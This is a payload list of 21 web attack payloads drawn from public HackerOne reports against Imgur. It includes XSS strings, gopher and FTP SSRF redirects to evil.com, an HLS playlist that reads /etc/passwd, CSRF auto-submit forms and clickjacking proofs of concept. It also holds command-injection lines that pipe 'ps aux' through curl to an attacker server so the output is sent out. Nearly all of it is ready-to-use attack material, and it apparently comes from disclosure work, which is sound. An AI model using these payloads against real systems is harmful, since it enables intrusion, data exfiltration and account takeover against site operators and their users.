# Imgur

21 payloads.

### `03ec8bae`

```
<iframe src="about:blank" id="x"></iframe>

<script>u='https://target.com/include/flash/swfupload.swf?buttonDisabled=&buttonText=%3Ca%20%20href=%22javascript:alert(document.domain)%22%3ECLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME%3C/a%3E&buttonImageURL=/&buttonTextStyle=a{color:%23ff00ff}&buttonAction=-120&buttonCursor=-2';
setInterval(function(){document.getElementById('x').contentWindow.location=u},300)</script>
```

**Parameter:** `buttonText`
— [Reflected Flash XSS using swfupload.swf with an epileptic reloading to bypass the button-event](https://hackerone.com/reports/91421) · Imgur · [fransrosen](https://hackerone.com/fransrosen)

### `1f2bcc05`

```
http://target.com/gallery/iT5l7%22%3E%3Cimg%20src=x%20onerror=alert(1
```

— [XSS target.com](https://hackerone.com/reports/97938) · Imgur · [charfee](https://hackerone.com/charfee)

### `c54c09eb`

```
http://target.com/user/phoenixrachel%22%3E%3Cimg%20src=x%20onerror=alert(1
```

**Parameter:** `user`
— [XSS in imgur mobile](https://hackerone.com/reports/106982) · Imgur · [charfee](https://hackerone.com/charfee)

### `1476eeab`

```
http://target.com/user/%22%3E%3Cimg%20src=x%20onerror=alert(1
```

**Parameter:** `user`
— [XSS in imgur mobile 3](https://hackerone.com/reports/107036) · Imgur · [charfee](https://hackerone.com/charfee)

### `62b8cbb8`

```
<?php
        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');
?>
```

— [SSRF in https://target.com/vidgif/url](https://hackerone.com/reports/115748) · Imgur · [aesteral](https://hackerone.com/aesteral)

### `005b2657`

```
<?php
        $commands = array(
                'HELO target.com',
                'MAIL FROM: <imgur@imgur.com>',
                'RCPT TO: <bit-bucket@test.evil.com>',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://evil2.com:25/_'.$payload);
?>
```

— [SSRF in https://target.com/vidgif/url](https://hackerone.com/reports/115748) · Imgur · [aesteral](https://hackerone.com/aesteral)

### `3e687cc6`

```
https://target.com/vidgif/url?url=ftp://evil.com:12345/TEST
```

**Parameter:** `url`
— [SSRF in https://target.com/vidgif/url](https://hackerone.com/reports/115748) · Imgur · [aesteral](https://hackerone.com/aesteral)

### `05bb029c`

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://target.com/2.mp4
#EXT-X-ENDLIST
```

— [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857) · Imgur · [sl1m](https://hackerone.com/sl1m)

### `facc92ae`

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://target.com/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```

— [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857) · Imgur · [sl1m](https://hackerone.com/sl1m)

### `cd48a960`

```
https://target.com/account/testcatplzignore%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain
```

**Parameter:** `username`
— [Reflected XSS in target.com](https://hackerone.com/reports/149855) · Imgur · [logue](https://hackerone.com/logue)

### `53257c57`

```
0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-
```

**Parameter:** `y`
— [RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`](https://hackerone.com/reports/212696) · Imgur · [neex](https://hackerone.com/neex)

### `ab752a52`

```
http://<your-account>.target.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303
```

**Parameter:** `y`
— [RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`](https://hackerone.com/reports/212696) · Imgur · [neex](https://hackerone.com/neex)

### `ac46fdeb`

```
ps aux|curl http://<your-server> -d @-
```

**Parameter:** `y`
— [RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`](https://hackerone.com/reports/212696) · Imgur · [neex](https://hackerone.com/neex)

### `bda2ed49`

```
https://target.com/email/unsubscribed?email=email@gmail.com%27%22%3E%3Csvg/onload=alert(document.domain)%3E
```

**Parameter:** `email`
— [Xss on target.com](https://hackerone.com/reports/274868) · Imgur · [madrobot](https://hackerone.com/madrobot)

### `3bcff9b6`

```
"'><img src=x onerror=prompt(1)>
```

**Parameter:** `name`
— [CSRF leads to a stored self xss](https://hackerone.com/reports/323005) · Imgur · [hogarth45](https://hackerone.com/hogarth45)

### `85b27675`

```
<html>
<body onload='document.forms[0].submit()'>
  <form method='POST' enctype='application/json' action='https://target.com/3/folders'>
    <input name='name' value='New Test"><img src=x onerror=prompt(2)>'>
    <input name='is_private' value='false'>
  </form>
</body>
</html>
```

**Parameter:** `name`
— [CSRF leads to a stored self xss](https://hackerone.com/reports/323005) · Imgur · [hogarth45](https://hackerone.com/hogarth45)

### `d51324c6`

```
<iframe src=http://target.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540></iframe>
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)

### `983522fa`

```
<iframe id=ifr></iframe>
<script>
ifr.onload=function(){
    console.log(ifr.contentWindow.frames.length);
}
</script>
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)

### `55866c3b`

```
<script>
setInterval(function(){
    
    navigator.clipboard.writeText("PAYLOAD").then(function(text){console.log(text)});

},1000)
</script>
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)

### `9f501306`

```
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>PoC</title>
    <style media="screen">
      iframe{
        opacity: 50%;
        width: 1000px;
        height: 500px;

      }
      #content{
        position: relative;
      }
      #btn1{
        position:absolute;
        top: 30px;
        left: 170px;
        vertical-align: middle;
        padding: 0px;
        background-color: #7a297a;
        color:white;
        border: 2px solid #7a297a;
   
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)

### `ac292bc4`

```
<<!<script>iframe src=javajavascriptscript:alert(document.domain)>
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)
